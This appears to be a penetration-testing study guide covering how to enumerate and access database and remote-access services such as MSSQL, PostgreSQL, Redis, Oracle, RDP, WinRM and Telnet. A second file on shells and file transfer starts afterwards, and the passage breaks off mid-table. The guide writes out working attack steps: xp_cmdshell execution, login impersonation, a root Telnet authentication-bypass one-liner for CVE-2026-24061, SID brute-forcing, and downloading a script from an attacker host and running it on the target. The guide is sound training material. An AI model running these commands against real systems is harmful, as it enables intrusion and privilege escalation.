Purpose and result Database data, a more useful SQL security context or verified server command execution. ### 2. Recognition clues SQL Server credentials or a Windows identity accepted by the database. #### Find the clue from your starting access **Where to investigate:** Once SQL Server authentication works, inspect actual login/server role and supported impersonation context. **Discovery action — reference example:** ```sql SELECT SYSTEM_USER, ORIGINAL_LOGIN(), @@VERSION; SELECT IS_SRVROLEMEMBER('sysadmin'); ``` **Illustrative evidence — synthetic, abbreviated:** The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. ```text SYSTEM_USER: DOMAIN\USER ORIGINAL_LOGIN: DOMAIN\USER IS_SRVROLEMEMBER: 0 ``` **Recognize this detail:** A valid login with sysadmin=0 is data/rights evidence, not permission to enable xp_cmdshell. **Still missing before method selection:** Enumerate actual database/server grants and useful impersonation; independently verify any OS facility and its identity. | Outcome after checking | Example and next decision | | --- | --- | | Enabled after validation | Required role/configuration and OS effect are verified: use the supported database-to-command method. | | Ruled out in this context | No facility/impersonation right rules out that proposed OS chain while readable data may remain. | | Inconclusive | A failed role query or unknown proxy context needs a narrower rights check. | **If you do not yet have this clue:** start with [Identify applications and validate selected NSE checks](discovery.md#identify-app). ### 3. Prerequisites **Starting access:** A confirmed reachable application; anonymous context or one identified credential. **Required conditions:** Correct SQL versus Windows authentication; database role and configuration must permit the requested operation. ### 4. Discover and verify prerequisites ```sql SELECT SYSTEM_USER, ORIGINAL_LOGIN(), @@VERSION; SELECT IS_SRVROLEMEMBER('sysadmin'); ``` ### 5. Why it works SQL login, sysadmin/impersonation rights and xp_cmdshell configuration are separate conditions. OS commands run under the SQL service or configured proxy context, not automatically as domain administrator. ### 6. Execute and choose variants ```bash impacket-mssqlclient 'USER@TARGET' impacket-mssqlclient 'DOMAIN/USER@TARGET' -windows-auth ``` Let the tool prompt for the password. At the SQL prompt: ```sql SELECT @@VERSION; SELECT SYSTEM_USER; SELECT IS_SRVROLEMEMBER('sysadmin'); SELECT name FROM sys.databases; USE DATABASE; SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES; SELECT TOP 20 * FROM SCHEMA.TABLE; ``` > **Interpret:** `IS_SRVROLEMEMBER('sysadmin')` returns `1`, `0` or `NULL`; `NULL` is not success. Impacket also exposes helpers such as `enum_impersonate` and `xp_cmdshell` depending on version and rights.
MSSQL variant — command-execution boundary ```sql EXEC xp_cmdshell 'whoami'; ``` `xp_cmdshell` is disabled by default on new installations. Enabling it generally requires high privilege and changes server configuration; do not enable it merely to enumerate. When available, a sysadmin's child process normally runs as the SQL Server service account; an authorized non-sysadmin may use a configured proxy. Verify returned identity before choosing the next action.
##### MSSQL linked-server and login-context mapping Treat a linked server as another authentication and authorization boundary. The local SQL login, its mapped remote login, remote SQL role and RPC/data-access settings can all differ. ```sql SELECT SYSTEM_USER AS current_login, ORIGINAL_LOGIN() AS original_login, SUSER_SNAME() AS effective_login, IS_SRVROLEMEMBER('sysadmin') AS is_sysadmin; SELECT name, product, provider, data_source, is_linked FROM sys.servers WHERE is_linked = 1; EXEC master.dbo.sp_helplinkedsrvlogin; ``` > **Interpret:** `sys.servers` proves configuration, not remote access. `sp_helplinkedsrvlogin` shows local-to-remote mappings; a `NULL` local login can represent a mapping that applies to all local logins. Preserve the local and remote identities separately. After selecting one named link, test the smallest remote query supported by its configuration: ```sql EXEC ('SELECT SYSTEM_USER AS remote_login, ORIGINAL_LOGIN() AS remote_original_login, IS_SRVROLEMEMBER(''sysadmin'') AS remote_is_sysadmin') AT [LINKED_SERVER]; ``` If RPC execution is disabled but data access is allowed, use a read-only pass-through query instead: ```sql SELECT * FROM OPENQUERY([LINKED_SERVER], 'SELECT SYSTEM_USER AS remote_login, ORIGINAL_LOGIN() AS remote_original_login'); ``` > **Decide:** a returned remote identity enables only the operations granted to that mapped login. `RPC OUT is disabled`, login-mapping failures and data-access failures rule out different mechanisms; they do not prove the server is unreachable. If `enum_impersonate` identifies a specific permitted login, test only that login and always return to the original context: ```sql EXECUTE AS LOGIN = 'LOGIN'; SELECT SYSTEM_USER, ORIGINAL_LOGIN(), SUSER_SNAME(), IS_SRVROLEMEMBER('sysadmin'); REVERT; ``` Do not enable RPC, create mappings or change server configuration merely to enumerate. A remote SQL query is not OS execution; independently validate any file or command facility and the operating-system identity behind it. Sources: [Microsoft `sys.servers`](https://learn.microsoft.com/sql/relational-databases/system-catalog-views/sys-servers-transact-sql), [`sp_helplinkedsrvlogin`](https://learn.microsoft.com/sql/relational-databases/system-stored-procedures/sp-helplinkedsrvlogin-transact-sql), [`EXECUTE AS`](https://learn.microsoft.com/sql/t-sql/statements/execute-as-transact-sql), and [`OPENQUERY`](https://learn.microsoft.com/sql/t-sql/functions/openquery-transact-sql). ### 7. Worked example — hypothetical Observation: Windows authentication succeeds to SQL Server. Test: inspect role and allowed impersonation. Illustrative output: only a low-privilege database user. Interpretation: enumerate permitted data and relationships before proposing xp_cmdshell. ### 8. Verify the result Verify SQL identity and any OS effect with hostname/whoami; record service/proxy execution identity. ### 9. Failure and fallback Login success with denied configuration changes is a rights boundary. Do not repeatedly enable an unavailable facility. ### 10. Next transitions [Convert database rights into a file or operating-system effect](web-exploitation.md#sql-os); [Classify the artifact and its identity context](credentials.md#credential-classify); [Verify command execution, host and represented identity](sessions-transfers.md#session-proof). ## Use PostgreSQL data and privileged program execution **Blocks:** 2; authenticated re-enumeration throughout. [Operational procedure](../../reference/02-service-enumeration/08-databases.md#postgresql) | [Quick sheet](../../cheatsheets/service-opportunities.md) ### 1. Purpose and result Database information or a verified privilege-backed OS effect. ### 2. Recognition clues PostgreSQL access or an application connection string. #### Find the clue from your starting access **Where to investigate:** Authenticate to the observed database and inspect current/session identity and role attributes before program/file functions. **Discovery action — reference example:** ```sql SELECT current_user,session_user,version(); SELECT rolname,rolsuper FROM pg_roles WHERE rolname=current_user; ``` **Illustrative evidence — synthetic, abbreviated:** The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. ```text current_user | session_user APP_USER | APP_USER rolname | rolsuper APP_USER | f ``` **Recognize this detail:** An ordinary database role does not automatically have COPY PROGRAM or server-file access. **Still missing before method selection:** Inspect effective role memberships and exact operation rights, then the database service's OS context. | Outcome after checking | Example and next decision | | --- | --- | | Enabled after validation | The needed execution/file role and a usable consumer are established: select that documented operation. | | Ruled out in this context | No superuser or required operation-specific privilege rules out the proposed program-execution route. | | Inconclusive | Unknown inherited role rights leave the operation unresolved; enumerate memberships before deciding. | **If you do not yet have this clue:** start with [Identify applications and validate selected NSE checks](discovery.md#identify-app). ### 3. Prerequisites **Starting access:** A confirmed reachable application; anonymous context or one identified credential. **Required conditions:** Accepted connection/database role; COPY PROGRAM needs the corresponding server privilege and an executable OS context. ### 4. Discover and verify prerequisites ```sql SELECT current_user,session_user,version(); SELECT rolname,rolsuper FROM pg_roles WHERE rolname=current_user; ``` ### 5. Why it works SQL access does not imply server superuser. File/program functions execute as the database service and are gated by database roles and OS permissions. ### 6. Execute and choose variants ```bash psql -h TARGET -p PORT -U USER -d postgres ``` ```text \conninfo \l \du \dn \dt *.* ``` ```sql SELECT version(), current_user, session_user; SELECT rolname, rolsuper, rolcreaterole, rolcreatedb FROM pg_roles; ```
PostgreSQL variant — server file/program privilege boundary ```sql SELECT pg_has_role(current_user, 'pg_read_server_files', 'member'); SELECT pg_has_role(current_user, 'pg_write_server_files', 'member'); SELECT pg_has_role(current_user, 'pg_execute_server_program', 'member'); ``` Server-side `COPY ... FROM/TO 'file'` uses the PostgreSQL server's filesystem and service identity. `COPY ... PROGRAM` executes on the server and requires superuser or the corresponding predefined role. Client-side `\copy` reads/writes the client filesystem and is not the same primitive.
> **Failure cues:** connection refusal/timeout is network or listener context; login rejection is authentication/context; an empty database list may be visibility limits; object denial is authorization. Query only bounded rows first. Never assume that reading application credentials or obtaining database admin implies OS execution. > **Next action:** identify application accounts, hashes/credentials, paths and linked systems; record the precise grant enabling any file or execution primitive; validate recovered credentials in the later credential block and re-enumerate after any identity change. ### 7. Worked example — hypothetical Observation: a database role can read application tables. Test: inspect role attributes. Illustrative output: rolsuper is false and program-execution rights are absent. Interpretation: recover useful data without treating SQL access as a shell. ### 8. Verify the result Separate returned rows, file operations and command execution; prove the actual operating-system identity for the latter. ### 9. Failure and fallback Role or OS permission failures require another allowed primitive, not a different spelling of the same denied operation. ### 10. Next transitions [Classify the artifact and its identity context](credentials.md#credential-classify); [Convert database rights into a file or operating-system effect](web-exploitation.md#sql-os); [Verify command execution, host and represented identity](sessions-transfers.md#session-proof). ## Inspect Redis access and persistence boundaries **Blocks:** 2; authenticated re-enumeration throughout. [Operational procedure](../../reference/02-service-enumeration/08-databases.md#redis) | [Quick sheet](../../cheatsheets/service-opportunities.md) ### 1. Purpose and result Useful accessible keys or a precisely bounded persistence/file-write candidate. ### 2. Recognition clues A Redis listener or application cache credentials. #### Find the clue from your starting access **Where to investigate:** Identify Redis and use its authentication context to distinguish accepted commands from denied administrative facilities. **Discovery action — reference example:** ```bash redis-cli -h TARGET -p PORT PING ``` **Illustrative evidence — synthetic, abbreviated:** The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. ```text PONG Administrative operation: NOPERM this user has no permissions ``` **Recognize this detail:** The connection is usable but command ACLs can remove persistence/configuration methods. **Still missing before method selection:** Inspect allowed operations, data visibility and actual persistence/destination/consumer conditions. | Outcome after checking | Example and next decision | | --- | --- | | Enabled after validation | Useful keys are readable or a fully permitted file-consumer chain exists: select that bounded capability. | | Ruled out in this context | CONFIG denied rules out the familiar configuration-backed file-write route under this identity. | | Inconclusive | PING alone leaves key and administrative rights unknown; inspect the selected permitted command. | **If you do not yet have this clue:** start with [Identify applications and validate selected NSE checks](discovery.md#identify-app). ### 3. Prerequisites **Starting access:** A confirmed reachable application; anonymous context or one identified credential. **Required conditions:** Reachability and accepted authentication/ACL commands; persistence writes need CONFIG rights, destination permissions and a consumer. ### 4. Discover and verify prerequisites ```bash redis-cli -h TARGET -p PORT PING ``` ### 5. Why it works Redis keys may disclose sessions or secrets. Historical file-write chains depend on command permissions, persistence format and a writable useful path; an open port alone proves none of them. ### 6. Execute and choose variants ```bash nmap -Pn -sV --script redis-info -p PORT TARGET redis-cli -h TARGET -p PORT PING redis-cli -h TARGET -p PORT INFO redis-cli -h TARGET -p PORT ACL WHOAMI redis-cli -h TARGET -p PORT ACL LIST ``` Authenticated when a password is legitimately known: ```bash redis-cli -h TARGET -p PORT --askpass ``` > `PONG` proves an accessible Redis command surface, not write/file/execution permission. Check ACLs, mode, bind/protected-mode and persistence/module configuration before reasoning about an effect. Do not run `CONFIG SET`, write keys or load modules during enumeration. ### 7. Worked example — hypothetical Observation: PING returns PONG but CONFIG is denied. Test: inspect allowed data access. Illustrative output: only application keys are readable. Interpretation: investigate session/credential value while rejecting a presumed arbitrary-file-write chain. ### 8. Verify the result Verify authentication context, allowed commands and actual key/file effects without assuming old Redis exploit defaults. ### 9. Failure and fallback NOAUTH and NOPERM identify different boundaries. Investigate credentials or permitted data rather than assuming unauthenticated execution. ### 10. Next transitions [Classify the artifact and its identity context](credentials.md#credential-classify); [Cross role, function or session authorization boundaries](web-exploitation.md#web-authz); [Match a public exploit to the actual component and configuration](public-exploits.md#exploit-select). ## Triage Oracle listener and database identity **Blocks:** 2; authenticated re-enumeration throughout. [Operational procedure](../../reference/02-service-enumeration/08-databases.md#oracle-tnssid-triage) | [Quick sheet](../../cheatsheets/service-opportunities.md) ### 1. Purpose and result A confirmed listener/service context and permission-scoped database access. ### 2. Recognition clues An Oracle TNS listener or connection descriptor. #### Find the clue from your starting access **Where to investigate:** Use service discovery and an application's connection descriptor to distinguish listener identification from a valid database session. **Discovery action — reference example:** ```bash nmap -Pn -sV -p 1521 TARGET ``` **Illustrative evidence — synthetic, abbreviated:** The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. ```text 1521/tcp open oracle-tns Oracle TNS Listener Application descriptor: SERVICE_NAME ``` **Recognize this detail:** Listener/product evidence and a service name establish a connection candidate, not database credentials or DBA rights. **Still missing before method selection:** Validate the exact descriptor/account and inspect its permitted database action. | Outcome after checking | Example and next decision | | --- | --- | | Enabled after validation | The selected account logs in and grants a useful operation: enumerate within that role. | | Ruled out in this context | The descriptor names a nonexistent service: reject that connection string before judging passwords. | | Inconclusive | An unidentified listener version or authentication error needs descriptor/account separation. | **If you do not yet have this clue:** start with [Identify applications and validate selected NSE checks](discovery.md#identify-app). ### 3. Prerequisites **Starting access:** A confirmed reachable application; anonymous context or one identified credential. **Required conditions:** Correct service/SID, reachable database transport and valid database credentials for authenticated work. ### 4. Discover and verify prerequisites ```bash nmap -Pn -sV -p 1521 TARGET ``` ### 5. Why it works A TNS listener is a connection broker; knowing its version or service name does not establish database authentication or DBA rights. ### 6. Execute and choose variants ```bash nmap -Pn -sV --script oracle-tns-version -p 1521 TARGET nmap -Pn --script oracle-sid-brute -p 1521 TARGET ``` > A discovered SID/service name is a namespace clue, not credentials. Continue with an installed Oracle client only when a legitimate identity is available; preserve listener/version/SID evidence and do not treat a conventional port as Oracle proof. Source supplement: reviewed getSH Nmap Oracle block. ### 7. Worked example — hypothetical Observation: TNS responds on 1521. Test: identify the configured service and validate a known credential. Illustrative output: listener identification succeeds but database authentication fails. Interpretation: retain the service clue and seek the correct account/descriptor. ### 8. Verify the result Distinguish listener identification, database login and a permitted SQL action. ### 9. Failure and fallback An invalid service descriptor is different from an invalid password; resolve it before further credential decisions. ### 10. Next transitions [Validate known passwords and context-specific reuse](credentials.md#credential-use); [Match a public exploit to the actual component and configuration](public-exploits.md#exploit-select); [Validate uncertain results and rebuild the service queue](discovery.md#result-validation). ## Validate RDP, WinRM, VNC and Telnet access contexts **Blocks:** 2; authenticated re-enumeration throughout. [Operational procedure](../../reference/02-service-enumeration/09-windows-remote-access.md) | [Quick sheet](../../cheatsheets/service-opportunities.md) ### 1. Purpose and result A verified remote session or a precise authentication/authorization failure. ### 2. Recognition clues An exposed remote-access application and compatible known credentials. #### Find the clue from your starting access **Where to investigate:** Take remote-access listeners from discovery and validate one known identity against the specific endpoint/logon type. **Discovery action — reference example:** ```powershell Test-NetConnection TARGET -Port 3389 Test-NetConnection TARGET -Port 5985 ``` **Illustrative evidence — synthetic, abbreviated:** The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. ```text RemotePort : 3389; TcpTestSucceeded : True RemotePort : 5985; TcpTestSucceeded : False ``` **Recognize this detail:** Transport offers an RDP candidate from this source; it does not establish remote-interactive rights. **Still missing before method selection:** Check actual protocol, local/domain context, accepted authentication and endpoint/logon authorization. | Outcome after checking | Example and next decision | | --- | --- | | Enabled after validation | The intended remote session opens and its identity is verified: enumerate the new host context. | | Ruled out in this context | A known-valid identity lacks that logon right: reject this access form for the account. | | Inconclusive | A timeout cannot distinguish host firewall, route or absent service; verify the failed layer. | **If you do not yet have this clue:** start with [Identify applications and validate selected NSE checks](discovery.md#identify-app). ### 3. Prerequisites **Starting access:** A confirmed reachable application; anonymous context or one identified credential. **Required conditions:** Enabled destination service, matching authentication and protocol-specific logon/session rights. ### 4. Discover and verify prerequisites ```powershell Test-NetConnection TARGET -Port 3389 Test-NetConnection TARGET -Port 5985 ``` ### 5. Why it works Remote interactive logon and remote management are different rights. VNC may use its own password; Telnet may expose a different account context from Windows/domain authentication. ### 6. Execute and choose variants > **Recognize:** RDP commonly uses TCP/3389; WinRM commonly uses 5985/HTTP and 5986/HTTPS. **Goal:** determine whether one known credential is accepted in the correct local/domain context and whether it is authorized for a usable session. ##### RDP baseline: authentication-only check ```bash xfreerdp3 /v:TARGET /u:USER /d:DOMAIN /auth-only /cert:ignore ``` Some distributions expose the binary as `xfreerdp`. Omit `/d:DOMAIN` for the intended local-account context; use `/u:TARGET\\USER` if needed to make that context explicit. > **Decisive output:** successful authentication-only validation supports that the credential is accepted for RDP/NLA. It does not prove an interactive desktop will be granted under every policy/session condition.
Variant — open an RDP desktop ```bash xfreerdp3 /v:TARGET /u:USER /d:DOMAIN /dynamic-resolution /cert:ignore ``` Let FreeRDP prompt for the password. `/cert:ignore` suppresses certificate validation and is suitable only in the controlled lab context; it removes server-identity protection.
Variant — identify RDP security requirements ```bash nmap -p 3389 --script rdp-enum-encryption,rdp-ntlm-info TARGET ``` This can disclose supported security layers, NLA and NTLM host/domain clues. It does not validate a credential.
##### RDP host-side inspection: local administrative context Use this read-only sequence after obtaining an authorized local administrative session on the destination, or when the exercise explicitly supplies equivalent remote-management access. It answers four different questions: is RDP enabled, is a listener actually present, what security layer/NLA policy applies, and does the candidate identity have an effective remote-interactive logon right? Do not change registry values or policy merely to make a credential work. ##### 1. Listener, service and configured port ```powershell Get-Service TermService reg query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections reg query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber qwinsta ``` ```cmd netstat -ano | findstr LISTENING | findstr ":3389" ``` > **Read:** `fDenyTSConnections = 0` permits RDP at the local setting; `1` denies new RDP connections. `PortNumber` is displayed as a registry DWORD, commonly hexadecimal `0xD3D` for 3389. A running `TermService` plus an `RDP-Tcp` listener in `qwinsta` and a listening socket establishes host-side listener state. A missing `:3389` socket is not decisive if `PortNumber` is nondefault. Policy can override the local value, so inspect resultant policy before treating this as effective configuration. ##### 2. NLA, transport security and policy precedence ```cmd reg query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication reg query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer reg query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v MinEncryptionLevel reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v fDenyTSConnections reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v UserAuthentication reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v SecurityLayer ``` ```cmd gpresult /scope computer /v ``` > **Read:** `UserAuthentication = 1` requires Network Level Authentication. For `SecurityLayer`, `0` is native RDP security, `1` negotiates, and `2` requires TLS. `MinEncryptionLevel` further constrains client compatibility. A missing policy value means “not configured at this policy path,” not that the feature is absent. Use `gpresult` to identify the winning computer policy when local and policy-backed values conflict or revert after refresh. These settings explain negotiation failures; they do not grant a user logon rights. ##### 3. Candidate membership and effective logon rights ```cmd net localgroup "Remote Desktop Users" whoami /groups ``` From an elevated PowerShell or Command Prompt, export the currently applied user-right assignments and inspect only the RDP entries: ```powershell $policy = Join-Path $env:TEMP 'rdp-user-rights.inf' secedit /export /mergedpolicy /areas user_rights /cfg $policy /quiet Select-String -Path $policy -Pattern '^SeRemoteInteractiveLogonRight','^SeDenyRemoteInteractiveLogonRight' ``` > **Read:** the candidate must be covered by `SeRemoteInteractiveLogonRight`; membership in local **Administrators** or **Remote Desktop Users** commonly supplies that right, but the actual applied policy is decisive. `SeDenyRemoteInteractiveLogonRight` overrides the allow right. Exported entries can be names or SIDs, so resolve unfamiliar SIDs before deciding. `whoami /groups` proves only the current process token; use it for the candidate only when you are actually running in that candidate's context. A group listing alone does not prove an effective right when domain policy or nested membership changes the result. ##### 4. Source-relative validation and decision ```bash nmap -Pn -n -p 3389 --reason TARGET xfreerdp3 /v:TARGET /u:USER /d:DOMAIN /auth-only /cert:ignore ``` > **Ready for an interactive attempt:** the actual source reaches the configured RDP port; the listener is enabled; the client can meet the NLA/security requirements; the credential is accepted in the intended local/domain context; and the identity has the effective allow right without an applicable deny right. **Ruled out in this context:** a decisive required condition is absent, such as an effective deny assignment or no listener on the configured port. **Inconclusive:** access to policy data is denied, group/SID expansion is unresolved, GPO precedence is unclear, or network filtering prevents source-relative validation. Do not turn an inconclusive result into “bad password” or “RDP disabled.” > **Security baseline:** on a normally secured host, RDP may be disabled when not needed; when enabled, NLA is normally retained, access is limited to intended administrative/remote-user principals, deny assignments override broad membership, and the firewall limits exposure. The state machine records deviations and capabilities; it does not recommend weakening these controls. ##### WinRM baseline: interactive session ```bash evil-winrm -i TARGET -u USER ``` ```bash evil-winrm -i TARGET -u 'DOMAIN\\USER' ``` Omitting `-p` makes the established Ruby client prompt for the password. > **Decisive output:** an interactive PowerShell prompt establishes WinRM authorization. Immediately verify identity and host context with `whoami`, `hostname` and `Get-NetIPAddress`.
Variant — WinRM over HTTPS ```bash evil-winrm -i TARGET -u USER -S -P 5986 ``` Check `evil-winrm -h` because the established Ruby client and newer `evil-winrm-py` use different long-option spelling. Do not assume a copied command matches the installed implementation.
Variant — Windows PowerShell remoting ```powershell $cred = Get-Credential Enter-PSSession -ComputerName TARGET -Credential $cred ``` PowerShell remoting uses the configured WinRM endpoint. Local trusted-host, Kerberos/name-resolution and endpoint authorization settings can fail independently of password validity.
> **Failure cues:** certificate warnings are different from authentication failure. RDP errors can reflect NLA, account context, expired/locked accounts or missing logon rights. WinRM `401` supports authentication/authorization failure; `WinRM cannot process the request` can be name resolution, trusted-host, listener or transport context. Valid SMB credentials do not guarantee RDP or WinRM rights. > **Next action:** after a session, re-enumerate identity, groups, privileges, files, local services/listeners and routes. Password spraying, pass-the-hash and ticket use belong to later credential/AD blocks. Host-inspection sources: [Microsoft RDP troubleshooting](https://learn.microsoft.com/en-us/troubleshoot/windows-server/remote/rdp-error-general-troubleshooting) · [Microsoft `secedit /export`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/secedit-export) · [Microsoft account-right constants](https://learn.microsoft.com/en-us/windows/win32/secauthz/account-rights-constants) · [Microsoft `qwinsta`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/qwinsta) · [Microsoft Remote Desktop Services policy](https://learn.microsoft.com/en-us/windows/client-management/mdm/policy-csp-remotedesktopservices) ##### VNC ```bash nmap -Pn -sV --script vnc-info -p PORT TARGET vncviewer TARGET:PORT ``` > VNC may expose a desktop without Windows logon semantics; the VNC server's authentication and the resulting OS session identity are separate. Use `realvnc-auth-bypass` or password testing only for a confirmed compatible product and explicit authorized objective, then verify the desktop identity. ##### Telnet ```bash nmap -Pn -sV -p PORT TARGET nc -nv TARGET PORT telnet TARGET PORT ``` > Telnet is plaintext and may expose a banner/login prompt. Validate only legitimately acquired credentials; do not make `telnet-brute` a baseline. After login, verify host and identity because appliance/application shells can differ from an OS shell. Source supplement: reviewed getSH Nmap VNC/Telnet blocks. ##### GNU Inetutils telnetd — conditional authentication-bypass check Use only after identifying the affected GNU Inetutils telnetd/login chain and its patch status. CVE-2026-24061 concerns how a supplied USER value reaches login; it does not apply to every Telnet server. Distribution backports matter. ```bash # Client supports sending the autologin USER environment value USER='-f root' telnet -a TARGET PORT ``` Read: if a shell is obtained, verify hostname and id. A prompt or echoed username is not root access. A different daemon, fixed build, client negotiation mismatch or a rejected USER value → return to service identification. The affected upstream range and distribution fixes must be checked against the advisory rather than inferred from port 23. Sources: [upstream 1](https://security-tracker.debian.org/tracker/CVE-2026-24061). ### 7. Worked example — hypothetical Observation: SMB accepts a credential but RDP rejects it. Test: separate the RDP service and logon-right checks. Illustrative output: the account lacks remote-interactive authorization. Interpretation: test a justified WinRM or SMB execution path instead. ### 8. Verify the result Verify destination hostname, represented identity and usable effect in the resulting session. ### 9. Failure and fallback A valid password is not proof of RDP/WinRM rights. Diagnose TLS, transport, account qualification and logon policy separately. ### 10. Next transitions [Obtain an authorized RDP interactive session](lateral-movement.md#move-rdp); [Use WinRM, WinRS or PowerShell remoting](lateral-movement.md#move-winrm); [Establish Windows token, host and process context](windows-privesc.md#windows-state). ## Investigate SIP/IRC identity and configuration clues **Blocks:** 2; authenticated re-enumeration throughout. [Operational procedure](../../reference/02-service-enumeration/12-sip-irc.md) | [Quick sheet](../../cheatsheets/service-opportunities.md) ### 1. Purpose and result Service capabilities, identity clues or an evidence-matched exploit candidate. ### 2. Recognition clues A confirmed SIP or IRC application. #### Find the clue from your starting access **Where to investigate:** Classify the unusual listener, then use its normal greeting/registration behavior and the owning procedure's bounded protocol checks. **Discovery action — reference example:** ```bash nmap -Pn -sV -p PORT TARGET nc -nv TARGET PORT ``` **Illustrative evidence — synthetic, abbreviated:** The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. ```text PORT/tcp open irc APPLICATION_VERSION :HOSTNAME NOTICE AUTH :registration required ``` **Recognize this detail:** The real protocol and registration state determine the next client operation; the expected port label is insufficient. **Still missing before method selection:** Verify application/version, accepted interaction and exact exploit/access conditions. | Outcome after checking | Example and next decision | | --- | --- | | Enabled after validation | Normal protocol interaction exposes useful configuration or an exact vulnerable component: follow that candidate. | | Ruled out in this context | The listener speaks another protocol: remove the SIP/IRC assumption. | | Inconclusive | A silent client-first or UDP service requires an appropriate protocol request; no greeting is not a version conclusion. | **If you do not yet have this clue:** start with [Identify applications and validate selected NSE checks](discovery.md#identify-app). ### 3. Prerequisites **Starting access:** A confirmed reachable application; anonymous context or one identified credential. **Required conditions:** Application-specific request format; permitted registration/channel/configuration access. ### 4. Discover and verify prerequisites ```bash nmap -Pn -sV -p PORT TARGET ``` ### 5. Why it works Protocol identification and configuration may expose useful users or product versions. Do not replace application evidence with the expected service at a conventional port. ### 6. Execute and choose variants These source-site topics contain only first-pass reconnaissance. Treat them as application-identification branches, not default exploitation paths. ##### SIP > Commonly UDP/TCP 5060 or TLS 5061; follow protocol evidence. ```bash nmap -Pn -sU -sV --script sip-methods -p 5060 TARGET nmap -Pn -sT -sV --script sip-methods -p 5060 TARGET ``` > **Decisive output:** a SIP response and supported methods. `open|filtered` without application response remains ambiguous. Do not run `sip-brute` until the exact registrar, known test identities, lockout policy and explicit authorization are established. ##### IRC ```bash nmap -Pn -sV --script irc-info -p PORT TARGET nc -nv TARGET PORT ``` Minimal registration for an authorized test client: ```text NICK testnick USER testuser 0 * :Test User QUIT ``` > **Decisive output:** IRC numeric replies, server/network name, version/capabilities or authentication requirement. Do not use `irc-brute` as identification; authenticate only with legitimately acquired credentials. ### 7. Worked example — hypothetical Observation: a nonstandard port responds as IRC. Test: inspect its normal registration/banner behavior. Illustrative output: a named build and accessible channel information. Interpretation: record identity clues and verify any public exploit's exact prerequisites. ### 8. Verify the result Retain protocol responses and distinguish product clues from confirmed vulnerabilities. ### 9. Failure and fallback A generic banner or denied registration leaves access unproven; return to version/configuration matching. ### 10. Next transitions [Match a public exploit to the actual component and configuration](public-exploits.md#exploit-select); [Validate known passwords and context-specific reuse](credentials.md#credential-use); [Identify applications and validate selected NSE checks](discovery.md#identify-app). ## Sources and shared concepts Supplied PEN-200 DNS pp136–142, SMB/SMTP pp156–160, SNMP pp161–164, databases pp282–285; service-specific official sources remain linked beside the operational procedures. [Hexdump enumeration supplement](https://github.com/LeonardoE95/OSCP). Commands and their adjacent variant conditions are synchronized extracts of the linked operational procedures. Those procedures own complete execution details; this guide owns method selection, explanations and worked reasoning. Tool availability on the learner's Kali or a target must be checked in that environment.

# Establish sessions and move files [Strategy map](../Attack_Strategy_Map.md) | [Master Notes](../Master_Notes.md) | [Operational index](../../README.md) | [Cheatsheets](../../cheatsheets/README.md) Delivery, execution, connection and a usable session are separate states. Select a connection direction and compatible interpreter before generating payloads; transfers must preserve bytes and destination permissions. **Speedrun blocks:** 7; transfers support 5–14. **Documented methods:** 12. Examples are hypothetical study material. Apply commands only to an assigned scope during the later practice phase. A method is enabled by its prerequisites; its presence here does not establish a vulnerability or practical mastery. ## First pass: tools and findings Use the branch matching the current host, identity and observed result. Tool output supplies leads; the linked procedure verifies and uses the exact condition. ### Verify the host and command identity A single response is not necessarily a stable session. Record the actual destination and output channel. ```bash hostname id pwd ip addr ip route ``` - **If Commands execute as the expected target identity:** Choose the available callback direction and interpreter. → [Connect a Linux reverse shell through an available interpreter](sessions-transfers.md#session-reverse). - **If Callback cannot reach the listener:** Inspect the actual initiator, destination and route. → [Diagnose connection direction, listener and session failures in order](execution.md#execution-callback). - **Otherwise:** Output cannot be attributed to the destination: repeat the host/identity proof. → [Verify command execution, host and represented identity](sessions-transfers.md#session-proof). ### Transfer a reviewed tool through a reachable route Serve from the attacker and download on the target only when that direction is reachable. Verify the received artifact. ```bash wget http://LHOST:8000/linpeas.sh -O /tmp/linpeas.sh chmod +x /tmp/linpeas.sh /tmp/linpeas.sh | tee /tmp/linpeas.txt ``` - **If The verified Linux enumerator is present:** Run the LinPEAS baseline and inspect its findings. → [Use enumeration tools to generate manually testable candidates](linux-privesc.md#linux-enumerators). - **If HTTP is unavailable but SSH file access works:** Use SCP instead of forcing the same failing transport. → [Copy files through an authenticated SSH service](sessions-transfers.md#transfer-scp). - **If SMB is the usable authenticated channel:** Use the SMB transfer procedure in that identity. → [Move Windows files through an authenticated SMB share](sessions-transfers.md#transfer-smb). - **Otherwise:** Bytes differ or the file is missing: fix transfer before interpreting execution errors. → [Match an artifact to its executable consumer and runtime](execution.md#execution-format). ## Discovery workflow Start with a claimed effect, command primitive or accepted remote identity; a usable shell and return path remain unproved. Follow these observations into a method; the detailed recognition routes below show synthetic output and the checks still needed. 1. Prerequisites **Starting access:** Verified command execution or authenticated remote access and a known network path. **Required conditions:** A functioning execution primitive and an observable output or controlled side effect. ### 4. Discover and verify prerequisites ```bash hostname id pwd ip addr ip route ``` ### 5. Why it works Execution, connection and a usable session are different capabilities. A command-output path may be enough to enumerate before any interactive shell exists. ### 6. Execute and choose variants ```text delivery → execution → connection → usable session ``` | State | Decisive evidence | Does not yet prove | | --- | --- | --- | | Delivery | Exact bytes/request reached intended consumer | Payload executed | | Execution | Harmless command output or 